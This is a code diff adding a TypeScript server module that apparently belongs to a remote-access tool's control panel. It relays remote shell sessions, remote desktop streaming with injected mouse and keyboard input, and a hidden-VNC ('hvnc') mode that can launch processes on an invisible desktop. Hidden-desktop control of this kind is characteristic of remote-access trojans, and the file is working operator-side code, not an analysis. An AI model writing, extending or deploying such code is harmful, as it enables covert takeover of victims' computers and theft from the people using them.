@@ -1,0 +1,550 @@
+import type { ServerWebSocket } from "bun";
+import { decode as msgpackDecode, encode as msgpackEncode } from "@msgpack/msgpack";
+import { v4 as uuidv4 } from "uuid";
+import * as clientManager from "../clientManager";
+import { logger } from "../logger";
+import { metrics } from "../metrics";
+import { encodeMessage } from "../protocol";
+import * as sessionManager from "../sessions/sessionManager";
+import type { ConsoleSession, RemoteDesktopViewer, SocketData } from "../sessions/types";
+import type { ClientInfo } from "../types";
+
+function decodeViewerPayload(raw: string | ArrayBuffer | Uint8Array): any | null {
+  if (typeof raw === "string") {
+    try {
+      return JSON.parse(raw);
+    } catch {
+      return null;
+    }
+  }
+  try {
+    const buf = raw instanceof Uint8Array ? raw : new Uint8Array(raw);
+    return msgpackDecode(buf);
+  } catch {
+    return null;
+  }
+}
+
+function safeSendViewer(ws: ServerWebSocket<SocketData>, payload: unknown) {
+  try {
+    ws.send(msgpackEncode(payload));
+  } catch (err) {
+    logger.error("[console] viewer send failed", err);
+  }
+}
+
+function safeSendViewerFrame(ws: ServerWebSocket<SocketData>, bytes: Uint8Array, header?: any): number {
+  try {
+    const meta = new Uint8Array(8);
+    meta[0] = 0x46;
+    meta[1] = 0x52;
+    meta[2] = 0x4d;
+    meta[3] = 1;
+    meta[4] = (header?.monitor ?? 0) & 0xff;
+    meta[5] = (header?.fps ?? 0) & 0xff;
+    const fmt = header?.format === "blocks" ? 2 : header?.format === "blocks_raw" ? 3 : 1;
+    meta[6] = fmt;
+    meta[7] = 0;
+
+    const buf = new Uint8Array(meta.length + bytes.length);
+    buf.set(meta, 0);
+    buf.set(bytes, meta.length);
+    ws.send(buf);
+    metrics.recordBytesSent(buf.length);
+    return buf.length;
+  } catch (err) {
+    logger.error("[rd] viewer frame send failed", err);
+    return 0;
+  }
+}
+
+const rdSendStats = { lastLog: 0, frames: 0, sendMs: 0, bytes: 0 };
+export const rdStreamingState = new Map<string, { isStreaming: boolean; display: number; quality: number; duplication: boolean }>();
+const rdInputPending = new Map<string, { clientId: string; sentAt: number; kind: string }>();
+const RD_INPUT_TTL_MS = 10_000;
+
+function pruneRdInputPending(now = Date.now()) {
+  for (const [id, pending] of rdInputPending.entries()) {
+    if (now - pending.sentAt > RD_INPUT_TTL_MS) {
+      rdInputPending.delete(id);
+    }
+  }
+}
+
+function recordRdInput(commandId: string, clientId: string, kind: string) {
+  pruneRdInputPending();
+  rdInputPending.set(commandId, { clientId, sentAt: Date.now(), kind });
+}
+
+export function notifyRdInputLatency(commandId: string) {
+  const pending = rdInputPending.get(commandId);
+  if (!pending) return;
+  rdInputPending.delete(commandId);
+
+  const ms = Date.now() - pending.sentAt;
+  for (const session of sessionManager.getAllRdSessions().values()) {
+    if (session.clientId !== pending.clientId) continue;
+    safeSendViewer(session.viewer, { type: "input_latency", ms, kind: pending.kind, commandId });
+  }
+}
+
+function logRdSend(header?: any) {
+  const now = Date.now();
+  if (now - rdSendStats.lastLog < 5000) return;
+  const frames = rdSendStats.frames || 1;
+  const avgMs = rdSendStats.sendMs / frames;
+  const avgBytes = rdSendStats.bytes / frames;
+  const fpsAgent = header?.fps ?? "?";
+  logger.debug(`[rd] send avg=${avgMs.toFixed(2)}ms size=${Math.round(avgBytes)}B frames=${rdSendStats.frames} agent_fps=${fpsAgent}`);
+  rdSendStats.lastLog = now;
+  rdSendStats.frames = 0;
+  rdSendStats.sendMs = 0;
+  rdSendStats.bytes = 0;
+}
+
+function sendConsoleCommand(target: ClientInfo | undefined, commandType: string, payload: Record<string, unknown>) {
+  if (!target) return false;
+  try {
+    target.ws.send(encodeMessage({ type: "command", commandType: commandType as any, payload, id: uuidv4() }));
+    metrics.recordCommand(commandType);
+    return true;
+  } catch (err) {
+    logger.error("[console] send command failed", err);
+    return false;
+  }
+}
+
+function sendDesktopCommandWithId(target: ClientInfo | undefined, commandType: string, payload: Record<string, unknown>, commandId: string) {
+  if (!target) return false;
+  try {
+    logger.debug(`[rd] send command ${commandType} -> ${target.id}`);
+    target.ws.send(encodeMessage({ type: "command", commandType: commandType as any, payload, id: commandId }));
+    metrics.recordCommand(commandType);
+    return true;
+  } catch (err) {
+    logger.error("[rd] send command failed", err);
+    return false;
+  }
+}
+
+export function sendDesktopCommand(target: ClientInfo | undefined, commandType: string, payload: Record<string, unknown>) {
+  return sendDesktopCommandWithId(target, commandType, payload, uuidv4());
+}
+
+function startConsoleForViewer(target: ClientInfo | undefined, sessionId: string, cols = 120, rows = 36) {
+  return sendConsoleCommand(target, "console_start", { sessionId, cols, rows });
+}
+
+export function stopConsoleOnTarget(target: ClientInfo | undefined, sessionId: string) {
+  return sendConsoleCommand(target, "console_stop", { sessionId });
+}
+
+export function notifyConsoleClosed(clientId: string, reason: string) {
+  for (const [sessionId, session] of sessionManager.getAllConsoleSessions().entries()) {
+    if (session.clientId !== clientId) continue;
+    safeSendViewer(session.viewer, { type: "status", status: "closed", reason, sessionId });
+    sessionManager.deleteConsoleSession(sessionId);
+  }
+}
+
+export function handleConsoleViewerOpen(ws: ServerWebSocket<SocketData>) {
+  const { clientId, sessionId } = ws.data;
+  const effectiveSessionId = sessionId || uuidv4();
+  ws.data.sessionId = effectiveSessionId;
+  const target = clientManager.getClient(clientId);
+  const session: ConsoleSession = { id: effectiveSessionId, clientId, viewer: ws, createdAt: Date.now() };
+  sessionManager.addConsoleSession(session);
+  safeSendViewer(ws, {
+    type: "ready",
+    sessionId: effectiveSessionId,
+    clientId,
+    clientOnline: !!target,
+    host: target?.host || clientId,
+    os: target?.os,
+    user: target?.user,
+  });
+  if (!target) {
+    safeSendViewer(ws, { type: "status", status: "offline", reason: "Client is offline", sessionId: effectiveSessionId });
+    return;
+  }
+  safeSendViewer(ws, { type: "status", status: "connecting", sessionId: effectiveSessionId });
+  startConsoleForViewer(target, effectiveSessionId);
+}
+
+export function handleRemoteDesktopViewerOpen(ws: ServerWebSocket<SocketData>) {
+  const { clientId } = ws.data;
+  const sessionId = uuidv4();
+  const target = clientManager.getClient(clientId);
+  const session: RemoteDesktopViewer = { id: sessionId, clientId, viewer: ws, createdAt: Date.now() };
+  sessionManager.getAllRdSessions().set(sessionId, session);
+  safeSendViewer(ws, { type: "ready", sessionId, clientId, clientOnline: !!target });
+  if (!target) {
+    safeSendViewer(ws, { type: "status", status: "offline", reason: "Client is offline", sessionId });
+    return;
+  }
+  safeSendViewer(ws, { type: "status", status: "connecting", sessionId });
+}
+
+export function notifyRemoteDesktopStatus(clientId: string, status: string, reason?: string) {
+  for (const session of sessionManager.getAllRdSessions().values()) {
+    if (session.clientId !== clientId) continue;
+    safeSendViewer(session.viewer, {
+      type: "status",
+      status,
+      reason,
+      sessionId: session.id,
+    });
+  }
+}
+
+export function handleRemoteDesktopViewerMessage(ws: ServerWebSocket<SocketData>, raw: string | ArrayBuffer | Uint8Array) {
+  const payload = decodeViewerPayload(raw);
+  if (!payload) return;
+  if (!payload || typeof payload.type !== "string") return;
+  const { clientId } = ws.data;
+  const target = clientManager.getClient(clientId);
+  if (!target) {
+    safeSendViewer(ws, { type: "status", status: "offline" });
+    return;
+  }
+
+  const state = rdStreamingState.get(clientId) || { isStreaming: false, display: 0, quality: 90, duplication: false };
+
+  logger.debug(`[rd] inbound viewer msg type=${payload.type} client=${clientId}`);
+  switch (payload.type) {
+    case "desktop_start":
+      if (!state.isStreaming) {
+        sendDesktopCommand(target, "desktop_start", {});
+        state.isStreaming = true;
+        rdStreamingState.set(clientId, state);
+        logger.debug(`[rd] started streaming for client ${clientId}`);
+      } else {
+        logger.debug(`[rd] ignoring duplicate desktop_start for client ${clientId}`);
+      }
+      break;
+    case "desktop_stop":
+      sendDesktopCommand(target, "desktop_stop", {});
+      if (state.isStreaming) {
+        state.isStreaming = false;
+        rdStreamingState.set(clientId, state);
+        logger.debug(`[rd] stopped streaming for client ${clientId}`);
+      } else {
+        rdStreamingState.set(clientId, { ...state, isStreaming: false });
+        logger.debug(`[rd] stop requested while not streaming for client ${clientId}`);
+      }
+      break;
+    case "desktop_select_display": {
+      const newDisplay = Number(payload.display) || 0;
+      if (state.display !== newDisplay) {
+        logger.debug(`[rd] changing display from ${state.display} to ${newDisplay}`);
+        sendDesktopCommand(target, "desktop_select_display", { display: newDisplay });
+        state.display = newDisplay;
+        rdStreamingState.set(clientId, state);
+      } else {
+        logger.debug(`[rd] ignoring duplicate display select ${newDisplay}`);
+      }
+      break;
+    }
+    case "desktop_set_quality": {
+      const newQuality = Number(payload.quality) || 90;
+      if (state.quality !== newQuality) {
+        sendDesktopCommand(target, "desktop_set_quality", { quality: newQuality, codec: payload.codec || "" });
+        state.quality = newQuality;
+        rdStreamingState.set(clientId, state);
+        logger.debug(`[rd] set quality to ${newQuality}`);
+      }
+      break;
+    }
+    case "desktop_enable_mouse":
+      sendDesktopCommand(target, "desktop_enable_mouse", { enabled: !!payload.enabled });
+      break;
+    case "desktop_enable_keyboard":
+      sendDesktopCommand(target, "desktop_enable_keyboard", { enabled: !!payload.enabled });
+      break;
+    case "desktop_enable_cursor":
+      sendDesktopCommand(target, "desktop_enable_cursor", { enabled: !!payload.enabled });
+      break;
+    case "desktop_set_duplication": {
+      const enabled = !!payload.enabled;
+      if (state.duplication !== enabled) {
+        sendDesktopCommand(target, "desktop_set_duplication", { enabled });
+        state.duplication = enabled;
+        rdStreamingState.set(clientId, state);
+        logger.debug(`[rd] set duplication to ${enabled}`);
+      }
+      break;
+    }
+    case "mouse_move": {
+      if (!state.isStreaming) break;
+      const rawX = (payload as any).x;
+      const rawY = (payload as any).y;
+      const commandId = uuidv4();
+      recordRdInput(commandId, clientId, "mouse_move");
+      sendDesktopCommandWithId(target, "desktop_mouse_move", { x: Number(rawX) || 0, y: Number(rawY) || 0 }, commandId);
+      break;
+    }
+    case "mouse_down": {
+      if (!state.isStreaming) break;
+      const commandId = uuidv4();
+      recordRdInput(commandId, clientId, "mouse_down");
+      sendDesktopCommandWithId(target, "desktop_mouse_down", { button: Number(payload.button) || 0 }, commandId);
+      break;
+    }
+    case "mouse_up": {
+      if (!state.isStreaming) break;
+      const commandId = uuidv4();
+      recordRdInput(commandId, clientId, "mouse_up");
+      sendDesktopCommandWithId(target, "desktop_mouse_up", { button: Number(payload.button) || 0 }, commandId);
+      break;
+    }
+    case "key_down": {
+      if (!state.isStreaming) break;
+      const commandId = uuidv4();
+      recordRdInput(commandId, clientId, "key_down");
+      sendDesktopCommandWithId(target, "desktop_key_down", { key: payload.key || "", code: payload.code || "" }, commandId);
+      break;
+    }
+    case "key_up": {
+      if (!state.isStreaming) break;
+      const commandId = uuidv4();
+      recordRdInput(commandId, clientId, "key_up");
+      sendDesktopCommandWithId(target, "desktop_key_up", { key: payload.key || "", code: payload.code || "" }, commandId);
+      break;
+    }
+    case "text_input": {
+      if (!state.isStreaming) break;
+      const commandId = uuidv4();
+      recordRdInput(commandId, clientId, "text_input");
+      sendDesktopCommandWithId(target, "desktop_text", { text: payload.text || "" }, commandId);
+      break;
+    }
+    default:
+      break;
+  }
+}
+
+function handleRemoteDesktopFrame(payload: any) {
+  const clientId = payload.clientId as string;
+  const header = payload.header;
+  const bytes = payload.data as Uint8Array;
+  const t0 = typeof performance !== "undefined" && performance.now ? performance.now() : Date.now();
+  const state = rdStreamingState.get(clientId) || { isStreaming: false, display: 0, quality: 90, duplication: false };
+  if (!state.isStreaming) {
+    rdStreamingState.set(clientId, { ...state, isStreaming: true });
+  }
+  for (const session of sessionManager.getAllRdSessions().values()) {
+    if (session.clientId !== clientId) continue;
+    const sentBytes = safeSendViewerFrame(session.viewer, bytes, header);
+    const t1 = typeof performance !== "undefined" && performance.now ? performance.now() : Date.now();
+    rdSendStats.frames += 1;
+    rdSendStats.bytes += sentBytes;
+    rdSendStats.sendMs += t1 - t0;
+  }
+  logRdSend(header);
+}
+
+(globalThis as any).__rdBroadcast = (clientId: string, bytes: Uint8Array, header?: any): boolean => {
+  let sent = false;
+  const t0 = typeof performance !== "undefined" && performance.now ? performance.now() : Date.now();
+  for (const session of sessionManager.getAllRdSessions().values()) {
+    if (session.clientId !== clientId) continue;
+    const sentBytes = safeSendViewerFrame(session.viewer, bytes, header);
+    const t1 = typeof performance !== "undefined" && performance.now ? performance.now() : Date.now();
+    rdSendStats.frames += 1;
+    rdSendStats.bytes += sentBytes;
+    rdSendStats.sendMs += t1 - t0;
+    sent = true;
+  }
+  logRdSend(header);
+  return sent;
+};
+
+export const hvncStreamingState = new Map<string, { isStreaming: boolean; display: number; quality: number }>();
+
+export function handleHVNCViewerOpen(ws: ServerWebSocket<SocketData>) {
+  const { clientId } = ws.data;
+  const sessionId = uuidv4();
+  const target = clientManager.getClient(clientId);
+  const session: RemoteDesktopViewer = { id: sessionId, clientId, viewer: ws, createdAt: Date.now() };
+  sessionManager.getAllHvncSessions().set(sessionId, session);
+  safeSendViewer(ws, { type: "ready", sessionId, clientId, clientOnline: !!target });
+  if (!target) {
+    safeSendViewer(ws, { type: "status", status: "offline", reason: "Client is offline", sessionId });
+    return;
+  }
+  safeSendViewer(ws, { type: "status", status: "connecting", sessionId });
+}
+
+function notifyHVNCStatus(clientId: string, status: string, reason?: string) {
+  for (const session of sessionManager.getAllHvncSessions().values()) {
+    if (session.clientId !== clientId) continue;
+    safeSendViewer(session.viewer, {
+      type: "status",
+      status,
+      reason,
+      sessionId: session.id,
+    });
+  }
+}
+
+export function handleHVNCViewerMessage(ws: ServerWebSocket<SocketData>, raw: string | ArrayBuffer | Uint8Array) {
+  const payload = decodeViewerPayload(raw);
+  if (!payload) return;
+  if (!payload || typeof payload.type !== "string") return;
+  const { clientId } = ws.data;
+  const target = clientManager.getClient(clientId);
+  if (!target) {
+    safeSendViewer(ws, { type: "status", status: "offline" });
+    return;
+  }
+
+  const state = hvncStreamingState.get(clientId) || { isStreaming: false, display: 0, quality: 90 };
+
+  logger.debug(`[hvnc] inbound viewer msg type=${payload.type} client=${clientId}`);
+  switch (payload.type) {
+    case "hvnc_start":
+      if (!state.isStreaming) {
+        sendHVNCCommand(target, "hvnc_start", {});
+        state.isStreaming = true;
+        hvncStreamingState.set(clientId, state);
+        logger.debug(`[hvnc] started streaming for client ${clientId}`);
+      } else {
+        logger.debug(`[hvnc] ignoring duplicate hvnc_start for client ${clientId}`);
+      }
+      break;
+    case "hvnc_stop":
+      if (state.isStreaming) {
+        sendHVNCCommand(target, "hvnc_stop", {});
+        state.isStreaming = false;
+        hvncStreamingState.set(clientId, state);
+        logger.debug(`[hvnc] stopped streaming for client ${clientId}`);
+      }
+      break;
+    case "hvnc_select_display": {
+      const newDisplay = Number(payload.display) || 0;
+      if (state.display !== newDisplay) {
+        logger.debug(`[hvnc] changing display from ${state.display} to ${newDisplay}`);
+        sendHVNCCommand(target, "hvnc_select_display", { display: newDisplay });
+        state.display = newDisplay;
+        hvncStreamingState.set(clientId, state);
+      } else {
+        logger.debug(`[hvnc] ignoring duplicate display select ${newDisplay}`);
+      }
+      break;
+    }
+    case "hvnc_set_quality": {
+      const newQuality = Number(payload.quality) || 90;
+      if (state.quality !== newQuality) {
+        sendHVNCCommand(target, "hvnc_set_quality", { quality: newQuality, codec: payload.codec || "" });
+        state.quality = newQuality;
+        hvncStreamingState.set(clientId, state);
+        logger.debug(`[hvnc] set quality to ${newQuality}`);
+      }
+      break;
+    }
+    case "hvnc_enable_mouse":
+      if (state.isStreaming) sendHVNCCommand(target, "hvnc_enable_mouse", { enabled: !!payload.enabled });
+      break;
+    case "hvnc_enable_keyboard":
+      if (state.isStreaming) sendHVNCCommand(target, "hvnc_enable_keyboard", { enabled: !!payload.enabled });
+      break;
+    case "hvnc_enable_cursor":
+      if (state.isStreaming) sendHVNCCommand(target, "hvnc_enable_cursor", { enabled: !!payload.enabled });
+      break;
+    case "hvnc_mouse_move":
+      if (state.isStreaming) sendHVNCCommand(target, "hvnc_mouse_move", { x: Number(payload.x) || 0, y: Number(payload.y) || 0 });
+      break;
+    case "hvnc_mouse_down":
+      if (state.isStreaming) sendHVNCCommand(target, "hvnc_mouse_down", { button: Number(payload.button) || 0 });
+      break;
+    case "hvnc_mouse_up":
+      if (state.isStreaming) sendHVNCCommand(target, "hvnc_mouse_up", { button: Number(payload.button) || 0 });
+      break;
+    case "hvnc_mouse_wheel":
+      if (state.isStreaming) sendHVNCCommand(target, "hvnc_mouse_wheel", { delta: Number(payload.delta) || 0, x: Number(payload.x) || 0, y: Number(payload.y) || 0 });
+      break;
+    case "hvnc_key_down":
+      if (state.isStreaming) sendHVNCCommand(target, "hvnc_key_down", { key: payload.key || "", code: payload.code || "" });
+      break;
+    case "hvnc_key_up":
+      if (state.isStreaming) sendHVNCCommand(target, "hvnc_key_up", { key: payload.key || "", code: payload.code || "" });
+      break;
+    case "hvnc_start_process":
+      sendHVNCCommand(target, "hvnc_start_process", { path: String(payload.path || "") });
+      break;
+    default:
+      break;
+  }
+}
+
+export function sendHVNCCommand(target: ClientInfo, commandType: string, payload: any) {
+  target.ws.send(encodeMessage({ type: "command", commandType: commandType as any, id: uuidv4(), payload }));
+}
+
+(globalThis as any).__hvncBroadcast = (clientId: string, bytes: Uint8Array, header?: any): boolean => {
+  let sent = false;
+  for (const session of sessionManager.getAllHvncSessions().values()) {
+    if (session.clientId !== clientId) continue;
+    safeSendViewerFrame(session.viewer, bytes, header);
+    sent = true;
+  }
+  return sent;
+};
+
+const textDecoder = new TextDecoder();
+
+export function handleConsoleViewerMessage(ws: ServerWebSocket<SocketData>, raw: string | ArrayBuffer | Uint8Array) {
+  const payload = decodeViewerPayload(raw);
+  if (!payload) return;
+  if (!payload || typeof payload.type !== "string") {
+    return;
+  }
+
+  const { clientId, sessionId } = ws.data;
+  const target = clientManager.getClient(clientId);
+  if (!target) {
+    safeSendViewer(ws, { type: "status", status: "offline", reason: "Client is offline", sessionId });
+    return;
+  }
+
+  switch (payload.type) {
+    case "input": {
+      const data = typeof payload.data === "string" ? payload.data : "";
+      sendConsoleCommand(target, "console_input", { sessionId, data });
+      break;
+    }
+    case "resize": {
+      const cols = Number(payload.cols) || 120;
+      const rows = Number(payload.rows) || 36;
+      sendConsoleCommand(target, "console_resize", { sessionId, cols, rows });
+      break;
+    }
+    case "stop": {
+      if (!sessionId) break;
+      stopConsoleOnTarget(target, sessionId);
+      break;
+    }
+    default:
+      break;
+  }
+}
+
+export function handleConsoleOutput(payload: any) {
+  const sessionId = payload.sessionId as string;
+  if (!sessionId) return;
+  const session = sessionManager.getConsoleSession(sessionId);
+  if (!session) return;
+  const data = payload.data ? textDecoder.decode(payload.data as Uint8Array) : "";
+  safeSendViewer(session.viewer, {
+    type: "output",
+    sessionId,
+    data,
+    exitCode: payload.exitCode,
+    error: payload.error,
+  });
+  if (payload.exitCode !== undefined || payload.error) {
+    const reason = payload.error ? payload.error : `Process exited (${payload.exitCode ?? ""})`;
+    safeSendViewer(session.viewer, { type: "status", status: "closed", reason, sessionId });
+    sessionManager.deleteConsoleSession(sessionId);
+  }
+}
